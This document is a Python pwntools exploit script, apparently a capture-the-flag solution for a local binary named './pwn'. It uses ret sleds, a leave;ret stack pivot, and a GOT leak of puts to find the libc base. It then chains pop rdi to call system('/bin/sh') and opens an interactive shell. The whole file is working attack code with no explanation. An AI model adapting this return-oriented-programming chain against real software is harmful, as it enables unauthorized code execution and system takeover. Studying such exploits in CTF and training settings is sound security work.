from pwn import *

context.log_level = "debug"
p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

leave_ret = 0x4012B5
ret = 0x40101A
pop_rdi = 0x40117E
fake_addr = 0x404080
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main_addr = 0x40123E
payload1 = p64(ret) * 25 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

print("payload1 length:", len(payload1))
p.recvuntil(b"storage:")
p.sendline(payload1)
payload2 = p64(0) + p64(fake_addr) + p64(leave_ret)
p.recvuntil(b"time!")
p.send(payload2)
p.recvuntil(b"Goodbye!\n")
leak = p.recv(timeout=5)
print("leak raw:", leak)
leak_addr = u64(leak.ljust(8, b"\x00"))
print("leak_addr:" + hex(leak_addr))

libc_base = leak_addr - libc.symbols["puts"]
print("libc_base:" + hex(libc_base))
onegadget = libc_base + 0x583F3
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

payload3 = p64(ret) * 20 + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)
print("payload3 length:", len(payload3))
p.recvuntil(b"storage:")
p.send(payload3)
payload4 = p64(0) + p64(fake_addr) + p64(leave_ret)
p.recvuntil(b"time!")
p.send(payload4)
p.interactive()
